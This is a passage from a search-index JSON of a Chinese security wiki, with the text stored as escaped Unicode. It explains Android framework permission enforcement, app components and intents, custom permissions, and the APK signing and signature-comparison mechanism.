\u63d0\u4f9b\u4e86\u51e0\u79cd\u65b9\u6cd5\u6765\u68c0\u67e5\u53d1\u9001\u8005\uff08\u6216\u670d\u52a1\u4f7f\u7528\u8005\uff09\u662f \u5426\u5df2\u88ab\u5206\u914d\u4e86\u6743\u9650\u3002 \u5728\u6211\u4eec\u8fd9\u4e2a\u5e93\uff0c\u8fd9\u4e9b\u8bbe\u65bd\u7531\u65b9\u6cd5 checkCallingOrSelfPermission \u8868\u793a\u3002 \u9664\u4e86\u8fd9\u79cd\u65b9\u6cd5\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u65b9\u6cd5\u53ef\u4ee5\u7528\u4e8e\u68c0\u67e5\u670d\u52a1\u8c03\u7528\u8005\u7684\u6743\u9650\u3002","title":"4.2.3 Android \u6846\u67b6\u5c42\u7684\u6743\u9650\u5b9e\u65bd"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android_3","text":"","title":"\u7b2c\u4e94\u7ae0 Android \u5e94\u7528\u5c42\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#51","text":"Android \u5e94\u7528\u4ee5 Android \u8f6f\u4ef6\u5305\uff08 .apk \uff09\u6587\u4ef6\u7684\u5f62\u5f0f\u5206\u53d1\u3002 \u4e00\u4e2a\u5305\u7531 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\uff0c \u8d44\u6e90\u6587\u4ef6\uff0c\u6e05\u5355\u6587\u4ef6\u548c\u672c\u5730\u5e93\u7ec4\u6210\uff0c\u5e76\u7531\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u81ea\u7b7e\u540d\u8bc1\u4e66\u7b7e\u540d\u3002 \u6bcf\u4e2a Android \u5e94\u7528\u7531\u56db\u4e2a\u7ec4\u4ef6\u7c7b\u578b\u7684\u51e0\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a\u6d3b\u52a8\uff08Activity\uff09\uff0c\u670d\u52a1\uff08Service\uff09\uff0c\u5e7f\u64ad\u63a5 \u6536\u5668\uff08Boardcast Reciver\uff09\u548c\u5185\u5bb9\u4f9b\u5e94\u5668\uff08Content Provider\uff09\u3002 \u5c06\u5e94\u7528\u5206\u79bb\u4e3a\u7ec4\u4ef6\u6709\u52a9\u4e8e \u5e94\u7528\u7684\u4e00\u90e8\u5206\u5728\u5e94\u7528\u4e4b\u95f4\u91cd\u7528\u3002 \u6d3b\u52a8\u3002 \u6d3b\u52a8\u662f\u7528\u6237\u754c\u9762\u7684\u5143\u7d20\u4e4b\u4e00\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2a\u6d3b\u52a8\u901a\u5e38\u4ee3\u8868\u4e00\u4e2a\u754c\u9762\u3002 \u670d\u52a1\u3002 \u670d\u52a1\u662f Android \u4e2d\u7684\u540e\u53f0\u5de5\u4f5c\u88c5\u7f6e\u3002 \u670d\u52a1\u53ef\u4ee5\u65e0\u9650\u671f\u8fd0\u884c\u3002 \u6700\u77e5\u540d\u7684\u670d\u52a1\u793a\u4f8b\u662f\u5728\u540e \u53f0\u64ad\u653e\u97f3\u4e50\u7684\u5a92\u4f53\u64ad\u653e\u5668\uff0c\u5373\u4f7f\u7528\u6237\u79bb\u5f00\u5df2\u542f\u52a8\u6b64\u670d\u52a1\u7684\u6d3b\u52a8\u3002 \u5e7f\u64ad\u63a5\u6536\u5668\u3002 \u5e7f\u64ad\u63a5\u6536\u5668\u662f\u5e94\u7528\u7684\u7ec4\u4ef6\uff0c\u5b83\u63a5\u6536\u5e7f\u64ad\u6d88\u606f\u5e76\u6839\u636e\u6240\u83b7\u5f97\u7684\u6d88\u606f\u542f\u52a8\u5de5\u4f5c\u6d41\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u662f\u4e3a\u5e94\u7528\u63d0\u4f9b\u5b58\u50a8\u548c\u68c0\u7d22\u6570\u636e\u7684\u80fd\u529b\u7684\u7ec4\u4ef6\u3002 \u5b83\u8fd8\u53ef\u4ee5\u4e0e\u53e6\u4e00\u5e94\u7528 \u5171\u4eab\u4e00\u7ec4\u6570\u636e\u3002 \u56e0\u6b64\uff0cAndroid \u5e94\u7528\u7531\u4e0d\u540c\u7684\u7ec4\u4ef6\u7ec4\u6210\uff0c\u6ca1\u6709\u4e2d\u592e\u5165\u53e3\u70b9\uff0c\u4e0d\u50cf Java \u7a0b\u5e8f\u548c main \u65b9\u6cd5\u90a3 \u6837\u3002 \u7531\u4e8e\u6ca1\u6709\u5165\u53e3\u70b9\uff0c\u6240\u6709\u7ec4\u4ef6\uff08\u5e7f\u64ad\u63a5\u6536\u5668\u9664\u5916\uff0c\u5b83\u4e5f\u53ef\u4ee5\u52a8\u6001\u5b9a\u4e49\uff09\u9700\u8981\u7531\u5e94\u7528\u7684\u5f00\u53d1 \u4eba\u5458\u5728 AndroidManifest.xml \u6587\u4ef6\u4e2d\u58f0\u660e\u3002 \u5206\u79bb\u6210\u7ec4\u4ef6\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5728\u5176\u5b83\u5e94\u7528\u4e2d\u4f7f\u7528\u7ec4\u4ef6\u3002 \u4f8b\u5982\uff0c\u5728\u6e05\u5355 5.1 \u4e2d\uff0c\u663e\u793a\u4e86\u4e00\u4e2a\u5e94\u7528\u7684 AndroidManifest.xml \u6587\u4ef6\u7684\u793a\u4f8b\u3002 \u6b64\u5e94\u7528\u5305\u542b\u7b2c 21 \u884c\u4e2d\u58f0\u660e\u7684\u4e00\u4e2a Activity \u3002\u5176\u4ed6\u5e94\u7528\u53ef\u80fd\u4f1a\u8c03\u7528\u6b64\u6d3b\u52a8\uff0c\u5c06\u6b64\u7ec4\u4ef6\u7684\u529f\u80fd\u96c6\u6210\u5230\u5176\u5e94\u7528 \u4e2d\u3002 Android \u63d0\u4f9b\u4e86\u5404\u79cd\u65b9\u5f0f\u6765\u8c03\u7528\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u65b9 \u6cd5 startActivity \u548c startActivityForResult \u542f\u52a8\u65b0\u7684\u6d3b\u52a8\u3002 \u670d\u52a1\u901a\u8fc7 startService \u65b9\u6cd5\u542f \u52a8\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u88ab\u8c03\u7528\u7684\u670d\u52a1\u8c03\u7528\u5176\u65b9\u6cd5 onStart \u3002 \u5f53\u5f00\u53d1\u4eba\u5458\u8981\u5728\u7ec4\u4ef6\u548c\u670d\u52a1\u4e4b\u95f4\u5efa \u7acb\u8fde\u63a5\u65f6\uff0c\u5b83\u8c03\u7528 bindService \u65b9\u6cd5\uff0c\u5e76\u5728\u88ab\u8c03\u7528\u7684\u670d\u52a1\u4e2d\u8c03\u7528 onBind \u65b9\u6cd5\u3002 \u5f53\u5e94\u7528\u6216\u7cfb\u7edf \u7ec4\u4ef6\u4f7f\u7528 sendBroadcast \uff0c sendOrderedBroadcast \u548c sendStickyBroadcast \u65b9\u6cd5\u53d1\u9001\u7279\u6b8a\u6d88\u606f \u65f6\uff0c\u5c06\u542f\u52a8\u5e7f\u64ad\u63a5\u6536\u5668\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u7531\u6765\u81ea\u5185\u5bb9\u89e3\u6790\u5668\u7684\u8bf7\u6c42\u8c03\u7528\u3002\u6240\u6709\u5176\u4ed6\u7ec4\u4ef6\u7c7b\u578b\u901a\u8fc7 Intent \uff08\u610f\u56fe\uff09\u6fc0\u6d3b\u3002 \u610f \u56fe\u662f Android \u4e2d\u57fa\u4e8e Binder \u6846\u67b6\u7684\u7279\u6b8a\u901a\u4fe1\u624b\u6bb5\u3002\u610f\u56fe\u88ab\u4f20\u9012\u7ed9\u6267\u884c\u7ec4\u4ef6\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u88ab\u8c03 \u7528\u7684\u7ec4\u4ef6\u53ef\u4ee5\u88ab\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u610f\u56fe\u8c03\u7528\u3002\u4e3a\u4e86\u663e\u793a\u8fd9\u4e9b\u7c7b\u578b\u7684\u5dee\u5f02\uff0c\u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u4f8b \u5b50\u3002\u4f8b\u5982\uff0c\u7528\u6237\u60f3\u8981\u5728\u5e94\u7528\u4e2d\u9009\u62e9\u56fe\u7247\u3002\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u663e\u5f0f\u610f\u56fe\u6216\u9690\u5f0f\u610f\u56fe\u6765\u8c03 \u7528\u9009\u62e9\u56fe\u7247\u7684\u7ec4\u4ef6\u3002\u5bf9\u4e8e\u7b2c\u4e00\u79cd\u610f\u56fe\u7c7b\u578b\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5728\u4ed6\u7684\u5e94\u7528\u7684\u7ec4\u4ef6\u4e2d\u5b9e\u73b0\u6311\u9009\u529f \u80fd\uff0c\u5e76\u4f7f\u7528\u5e26\u6709\u7ec4\u4ef6\u540d\u79f0\u6570\u636e\u5b57\u6bb5\u7684\u663e\u5f0f\u610f\u56fe\u8c03\u7528\u6b64\u7ec4\u4ef6\u3002\u5f53\u7136\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u8c03\u7528\u5176\u4ed6\u5e94 \u7528\u7684\u7ec4\u4ef6\uff0c\u4f46\u662f\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4ed6\u5fc5\u987b\u786e\u4fdd\u8be5\u5e94\u7528\u5b89\u88c5\u5728\u7cfb\u7edf\u4e2d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4ece\u5f00\u53d1\u4eba\u5458\u7684 \u89d2\u5ea6\u6765\u770b\uff0c\u4e00\u4e2a\u5e94\u7528\u4e2d\u7684\u7ec4\u4ef6\u6216\u4e0d\u540c\u5e94\u7528\u7684\u7ec4\u4ef6\u4e4b\u95f4\u7684\u4ea4\u4e92\u4e0d\u5b58\u5728\u5dee\u5f02\u3002\u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u610f\u56fe\u7c7b \u578b\uff0c\u5f00\u53d1\u4eba\u5458\u5c06\u9009\u62e9\u9002\u5f53\u7ec4\u4ef6\u7684\u6743\u5229\u8f6c\u79fb\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002 intent \u5bf9\u8c61\u5728 \u5176 Action \uff0c Data \u548c Category \u5b57\u6bb5\u4e2d\u5305\u542b\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u4f7f\u7528\u610f\u56fe\u8fc7\u6ee4\u5668\uff0c\u64cd\u4f5c \u7cfb\u7edf\u9009\u62e9\u53ef\u4ee5\u5904\u7406\u610f\u56fe\u7684\u9002\u5f53\u7ec4\u4ef6\u3002\u610f\u56fe\u8fc7\u6ee4\u5668\u5b9a\u4e49\u4e86\u7ec4\u4ef6\u53ef\u4ee5\u5904\u7406\u7684\u610f\u56fe\u7684\u201c\u6a21\u677f\"\u3002\u5f53\u7136\uff0c \u76f8\u540c\u7684\u5e94\u7528\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u610f\u56fe\u8fc7\u6ee4\u5668\uff0c\u5b83\u5c06\u5904\u7406\u6765\u81ea\u5176\u4ed6\u7ec4\u4ef6\u7684\u610f\u56fe\u3002","title":"5.1 \u5e94\u7528\u7ec4\u4ef6"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#52","text":"\u6743\u9650\u4e0d\u4ec5\u7528\u4e8e\u4fdd\u62a4\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u3002 \u7b2c\u4e09\u65b9\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u6743\u9650\u6765\u4fdd\u62a4 \u5bf9\u5176\u5e94\u7528\u7684\u7ec4\u4ef6\u7684\u8bbf\u95ee\u3002 \u81ea\u5b9a\u4e49\u6743\u9650\u58f0\u660e\u7684\u793a\u4f8b\u5982\u6e05\u5355 5.1 \u4e2d\u7b2c 11 \u884c\u6240\u793a\u3002\u81ea\u5b9a\u4e49\u6743\u9650\u7684\u58f0 \u660e\u7c7b\u4f3c\u4e8e\u7cfb\u7edf\u6743\u9650\u4e4b\u4e00\u3002 \u4e3a\u4e86\u8bf4\u660e\u81ea\u5b9a\u4e49\u6743\u9650\u7684\u7528\u6cd5\uff0c\u8bf7\u53c2\u8003\u56fe 5.1\u3002\u7531 3 \u4e2a\u7ec4\u4ef6\u7ec4\u6210\u7684\u5e94\u7528 2 \u5e0c\u671b\u4fdd\u62a4\u5bf9\u5176\u4e2d\u4e24\u4e2a\u7684 \u8bbf\u95ee\uff1aC1 \u548c C2\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u6807\uff0c\u5e94\u7528 2 \u7684\u5f00\u53d1\u8005\u5fc5\u987b\u58f0\u660e\u4e24\u4e2a\u6743\u9650\u6807\u7b7e p1 \uff0c p2 \uff0c\u5e76 \u76f8\u5e94\u5730\u5c06\u5b83\u4eec\u5206\u914d\u7ed9\u53d7\u4fdd\u62a4\u7684\u7ec4\u4ef6\u3002\u5982\u679c\u5e94\u7528 1 \u7684\u5f00\u53d1\u8005\u60f3\u8981\u8bbf\u95ee\u5e94\u7528 2 \u7684\u7ec4\u4ef6 C1 \uff0c\u5219\u4ed6 \u5fc5\u987b\u5b9a\u4e49\u4ed6\u7684\u5e94\u7528\u9700\u8981\u6743\u9650 p1 \u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528 1 \u5c31\u53ef\u4ee5\u4f7f\u7528\u5e94\u7528 2 \u7684\u7ec4\u4ef6 C1\u3002\u5982\u679c \u5e94\u7528\u6ca1\u6709\u6307\u5b9a\u6240\u9700\u7684\u6743\u9650\uff0c\u5219\u7981\u6b62\u8bbf\u95ee\u53d7\u6b64\u6743\u9650\u4fdd\u62a4\u7684\u7ec4\u4ef6\uff08\u53c2\u89c1\u56fe 5.1 \u4e2d\u7ec4\u4ef6 C2 \u7684\u60c5 \u51b5\uff09\u3002\u56de\u5934\u770b\u770b\u6211\u4eec\u5728\u4ee3\u7801 5.1 \u4e2d\u7684 AndroidManifest.xml \u6587\u4ef6\u7684\u4f8b\u5b50\uff0c\u6d3b\u52a8 TestActivity \u88ab \u6743\u9650 com.testpackage.permission.mypermission \u4fdd\u62a4\uff0c\u5b83\u5728\u540c\u4e00\u4e2a\u5e94\u7528\u6e05\u5355\u6587\u4ef6\u4e2d\u58f0\u660e\u3002\u5982\u679c \u53e6\u4e00\u4e2a\u5e94\u7528\u60f3\u8981\u4f7f\u7528 TestActivity \u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u5b83\u5fc5\u987b\u8bf7\u6c42\u4f7f\u7528\u6b64\u6743\u9650\uff0c\u7c7b\u4f3c\u4e8e\u7b2c 16 \u884c\u4e2d \u7684\u64cd\u4f5c\u3002 ActivityManagerService \u8d1f\u8d23\u8c03\u7528\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u5e94\u7528\u7ec4\u4ef6\u7684\u5b89\u5168\u6027\uff0c\u5728\u7528\u4e8e\u8c03\u7528\u7ec4 \u4ef6\u7684\u6846\u67b6\u65b9\u6cd5\uff08\u4f8b\u5982\uff0c5.1 \u8282\u4e2d\u63cf\u8ff0\u7684 startActivity \uff09\u4e2d\uff0c\u653e\u7f6e\u7279\u6b8a\u7684\u94a9\u5b50\u3002 \u8fd9\u4e9b\u94a9\u5b50\u68c0\u67e5 \u5e94\u7528\u662f\u5426\u6709\u6743\u8c03\u7528\u7ec4\u4ef6\u3002 \u8fd9\u4e9b\u68c0\u67e5\u4ee5 PackageManagerServer \u7c7b\u7684 CheckUidPermission \u65b9\u6cd5\u7ed3 \u675f\uff08\u53c2\u89c1\u6e05\u5355 4.6\uff09\u3002 \u56e0\u6b64\uff0c\u53d1\u751f\u5728 Android \u6846\u67b6\u5c42\u7684\u5b9e\u9645\u7684\u6743\u9650\u5b9e\u65bd\uff0c\u53ef\u4ee5\u770b\u505a Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u53d7\u4fe1\u4efb\u90e8\u5206\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u4e0d\u80fd\u7ed5\u8fc7\u68c0\u67e5\u3002 \u6709\u5173\u5982\u4f55\u8c03\u7528\u7ec4\u4ef6\u548c\u6743\u9650\u68c0\u67e5\u7684\u66f4\u591a\u4fe1 \u606f\uff0c\u8bf7\u53c2\u89c1[8]","title":"5.2 \u5e94\u7528\u5c42\u7684\u6743\u9650"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android_4","text":"","title":"\u7b2c\u516d\u7ae0 Android \u5b89\u5168\u7684\u5176\u5b83\u8bdd\u9898"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#61-android","text":"Android \u5e94\u7528\u7a0b\u5e8f\u4ee5 Android \u5e94\u7528\u5305\u6587\u4ef6\uff08 .apk \u6587\u4ef6\uff09\u7684\u5f62\u5f0f\u5206\u53d1\u5230\u8bbe\u5907\u4e0a\u3002 \u7531\u4e8e\u8fd9\u4e2a\u5e73\u53f0 \u7684\u7a0b\u5e8f\u4e3b\u8981\u662f\u7528 Java \u7f16\u5199\u7684\uff0c\u6240\u4ee5\u8fd9\u79cd\u683c\u5f0f\u4e0e Java \u5305\u7684\u683c\u5f0f -- jar \uff08Java Archive\uff09\u6709\u5f88 \u591a\u5171\u540c\u70b9\uff0c\u5b83\u7528\u4e8e\u5c06\u4ee3\u7801\uff0c\u8d44\u6e90\u548c\u5143\u6570\u636e\uff08\u6765\u81ea\u53ef\u9009\u7684 META-INF \u76ee\u5f55 \uff09\u6587\u4ef6\u4f7f\u7528 zip \u5f52\u6863\u7b97 \u6cd5\u8f6c\u6362\u6210\u4e00\u4e2a\u6587\u4ef6\u3002 META-INF \u76ee\u5f55\u5b58\u50a8\u8f6f\u4ef6\u5305\u548c\u6269\u5c55\u914d\u7f6e\u6570\u636e\uff0c\u5305\u62ec\u5b89\u5168\u6027\uff0c\u7248\u672c\u63a7\u5236\uff0c\u6269 \u5c55\u548c\u670d\u52a1[5]\u3002 \u57fa\u672c\u4e0a\uff0c\u5728 Android \u7684\u60c5\u51b5\u4e2d\uff0c apkbuilder \u5de5\u5177\u5c06\u6784\u5efa\u7684\u9879\u76ee\u6587\u4ef6\u538b\u7f29\u5230\u4e00\u8d77 [1]\uff0c\u4f7f\u7528\u6807\u51c6\u7684 Java \u5de5\u5177 jarsigner \u5bf9\u8fd9\u4e2a\u5f52\u6863\u6587\u4ef6\u7b7e\u540d[6]\u3002 \u5728\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u8fc7\u7a0b \u4e2d\uff0c jarsigner \u521b\u5efa META-INF \u76ee\u5f55\uff0c\u5728 Android \u4e2d\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u6587\u4ef6\uff1a\u6e05\u5355\u6587\u4ef6 \uff08 MANIFEST.MF \uff09\uff0c\u7b7e\u540d\u6587\u4ef6\uff08\u6269\u5c55\u540d\u4e3a .SF \uff09\u548c\u7b7e\u540d\u5757\u6587\u4ef6\uff08 .RSA \u6216 .DSA \uff09 \u3002 \u6e05\u5355\u6587\u4ef6\uff08 MANIFEST.MF \uff09\u7531\u4e3b\u5c5e\u6027\u90e8\u5206\u548c\u6bcf\u4e2a\u6761\u76ee\u5c5e\u6027\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5305\u542b\u5728\u672a\u7b7e\u540d\u7684 apk \u4e2d \u6587\u4ef6\u62e5\u6709\u4e00\u4e2a\u6761\u76ee\u3002 \u8fd9\u4e9b\u6bcf\u4e2a\u6761\u76ee\u4e2d\u7684\u5c5e\u6027\u5b58\u50a8\u6587\u4ef6\u540d\u79f0\u4fe1\u606f\uff0c\u4ee5\u53ca\u4f7f\u7528 base64 \u683c\u5f0f\u7f16\u7801 \u7684\u6587\u4ef6\u5185\u5bb9\u6458\u8981\u3002 \u5728 Android \u4e0a\uff0cSHA1 \u7b97\u6cd5\u7528\u4e8e\u8ba1\u7b97\u6458\u8981\u3002 \u6e05\u5355 6.1 \u4e2d\u63d0\u4f9b\u4e86\u6e05\u5355\u6587\u4ef6\u7684 \u6458\u5f55\u3002 1 Manifest\u2212Version : 1.0 2 Created\u2212By: 1.6.0 41 (Sun Microsystems Inc. ) 3 4 Name: res/layout/main . xml 5 SHA1\u2212Digest : NJ1YLN3mBEKTPibVXbFO8eRCAr8= 6 7 Name: AndroidManifest . xml 8 SHA1\u2212Digest : wBoSXxhOQ2LR/pJY7Bczu1sWLy4= \u4ee3\u7801 6.1\uff1a\u6e05\u5355\u6587\u4ef6\u7684\u6458\u5f55 \u5305\u542b\u88ab\u7b7e\u540d\u6570\u636e\u7684\u7b7e\u540d\u6587\u4ef6\uff08 .SF \uff09\u7684\u5185\u5bb9\u7c7b\u4f3c\u4e8e MANIFEST.MF \u7684\u5185\u5bb9\u3002 \u8fd9\u4e2a\u6587\u4ef6\u7684\u4e00\u4e2a\u4f8b \u5b50\u5982\u6e05\u5355 6.2 \u6240\u793a\u3002 \u4e3b\u8981\u90e8\u5206\u5305\u542b\u6e05\u5355\u6587\u4ef6\u7684\u4e3b\u8981\u5c5e\u6027\u7684\u6458\u8981 \uff08 SHA1-Digest-Manifest-Main-Attributes \uff09\u548c\u5185\u5bb9\u6458\u8981\uff08 SHA1-Digest-Manifest \uff09\u3002 \u6bcf\u4e2a\u6761 \u76ee\u5305\u542b\u6e05\u5355\u6587\u4ef6\u4e2d\u7684\u6761\u76ee\u7684\u6458\u8981\u4ee5\u53ca\u76f8\u5e94\u7684\u6587\u4ef6\u540d \u6700\u540e\u4e00\u90e8\u5206\u662f\u7b7e\u540d\u5757\u6587\u4ef6\uff08 .DSA \u6216 .RSA \uff09\u3002 \u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5305\u542b\u7b7e\u540d\u6587\u4ef6\u7684\u7b7e\u540d\u7248\u672c; \u5b83 \u4e0e\u76f8\u5e94\u7684 .SF \u6587\u4ef6\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002 \u6839\u636e\u6240\u4f7f\u7528\u7684\u7b97\u6cd5\uff08RSA \u6216 DSA\uff09\uff0c\u5b83\u6709\u4e0d\u540c\u7684\u6269\u5c55 \u540d\u3002 \u76f8\u540c\u7684apk\u6587\u4ef6\u6709\u53ef\u80fd\u7b7e\u7f72\u51e0\u4e2a\u4e0d\u540c\u7684\u8bc1\u4e66\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5728 META-INF \u76ee\u5f55\u4e2d\u5c06\u6709\u51e0 \u4e2a .SF \u548c .DSA \u6216 .RSA \u6587\u4ef6\uff08\u5b83\u4eec\u7684\u6570\u91cf\u5c06\u7b49\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u7684\u6b21\u6570\uff09\u3002","title":"6.1 Android \u7b7e\u540d\u8fc7\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#611-android","text":"\u5927\u591a\u6570 Android \u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5f00\u53d1\u4eba\u5458\u7b7e\u540d\u7684\u8bc1\u4e66\uff08\u6ce8\u610f Android \u7684\u201c\u8bc1\u4e66\u201d\u548c\u201c\u7b7e\u540d\u201d\u53ef\u4ee5\u4e92 \u6362\u4f7f\u7528\uff09\u3002 \u6b64\u8bc1\u4e66\u7528\u4e8e\u786e\u4fdd\u539f\u59cb\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u53ca\u5176\u66f4\u65b0\u6765\u81ea\u540c\u4e00\u4f4d\u7f6e\uff0c\u5e76\u5728\u540c\u4e00\u5f00\u53d1\u4eba\u5458 \u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u3002 \u4e3a\u4e86\u6267\u884c\u8fd9\u4e2a\u68c0\u67e5\uff0cAndroid \u53ea\u662f\u6bd4\u8f83\u8bc1\u4e66\u7684\u4e8c\u8fdb\u5236\u8868\u793a\uff0c \u5b83\u7528\u4e8e\u7b7e\u7f72\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u66f4\u65b0\uff08\u7b2c\u4e00\u79cd\u60c5\u51b5\uff09\u548c\u534f\u4f5c\u5e94\u7528\u7a0b\u5e8f\uff08\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff09\u3002 \u8fd9\u79cd\u5bf9\u8bc1\u4e66\u7684\u68c0\u67e5\u901a\u8fc7 PackageManagerService \u4e2d\u7684\u65b9 \u6cd5 int compareSignatures(Signature[] s1\uff0cSignature[] s2) \u6765\u5b9e\u73b0\uff0c\u4ee3\u7801\u5982\u6e05\u5355 6.3 \u6240\u793a\u3002\u5728 \u4e0a\u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u5728 Android \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u4e0d\u540c\u7684\u8bc1\u4e66\u7b7e\u7f72\u76f8\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u89e3 \u91ca\u4e86\u4e3a\u4ec0\u4e48\u8be5\u65b9\u6cd5\u4f7f\u7528\u4e24\u4e2a\u7b7e\u540d\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002\u5c3d\u7ba1\u8be5\u65b9\u6cd5\u5728 Android \u5b89\u5168\u89c4\u5b9a\u4e2d\u5360\u6709\u91cd\u8981 \u5730\u4f4d\uff0c\u4f46\u5176\u884c\u4e3a\u5f3a\u70c8\u4f9d\u8d56\u4e8e\u5e73\u53f0\u7684\u7248\u672c\u3002\u5728\u8f83\u65b0\u7248\u672c\u4e2d\uff08\u4ece Android 2.2 \u5f00\u59cb\uff09\uff0c\u6b64\u65b9\u6cd5\u6bd4\u8f83 \u4e24\u4e2a Signature \u6570\u7ec4\uff0c\u5982\u679c\u4e24\u4e2a\u6570\u7ec4\u4e0d\u7b49\u4e8e null \uff0c\u5e76\u4e14\u5982\u679c\u6240\u6709 s2 \u7b7e\u540d\u90fd\u5305\u542b\u5728 s1 \u4e2d\uff0c \u5219\u8fd4\u56de SIGNATURE MATCH \u503c\uff0c\u5426\u5219\u4e3a SIGNATURE_NOT_MATCH \u3002\u5728\u7248\u672c 2.2 \u4e4b\u524d\uff0c\u6b64\u65b9\u6cd5\u68c0\u67e5\u6570 \u7ec4 s1 \u662f\u5426\u5305\u542b\u5728 s2 \u4e2d\u3002\u8fd9\u79cd\u884c\u4e3a\u5141\u8bb8\u7cfb\u7edf\u5b89\u88c5\u5347\u7ea7\uff0c\u5373\u4f7f\u5b83\u4eec\u5df2\u7ecf\u4f7f\u7528\u539f\u59cb\u5e94\u7528\u7a0b\u5e8f\u7684\u8bc1 \u4e66\u5b50\u96c6\u7b7e\u540d[2]\u3002 \u5728\u51e0\u79cd\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u540c\u4e00\u5f00\u53d1\u4eba\u5458\u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u3002 \u7b2c\u4e00\u79cd\u60c5\u51b5 \u4e0e signature \u548c signatureOrSystem \u7684\u6743\u9650\u76f8\u5173\u3002 \u8981\u4f7f\u7528\u53d7\u8fd9\u4e9b\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\uff0c\u58f0\u660e\u6743\u9650\u548c \u8bf7\u6c42\u5b83\u7684\u5305\u5fc5\u987b\u4f7f\u7528\u540c\u4e00\u7ec4\u8bc1\u4e66\u7b7e\u540d\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5\u4e0e Android \u8fd0\u884c\u5177\u6709\u76f8\u540c UID \u6216\u751a\u81f3\u5728\u76f8 \u540c Linux \u8fdb\u7a0b\u4e2d\u8fd0\u884c\u4e0d\u540c\u5e94\u7528\u7a0b\u5e8f\u7684\u80fd\u529b\u6709\u5173\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8bf7\u6c42\u6b64\u7c7b\u884c\u4e3a\u7684\u5e94\u7528\u7a0b\u5e8f\u5fc5 \u987b\u4f7f\u7528\u76f8\u540c\u7684\u7b7e\u540d\u8fdb\u884c\u7b7e\u540d\u3002","title":"6.1.1 Android 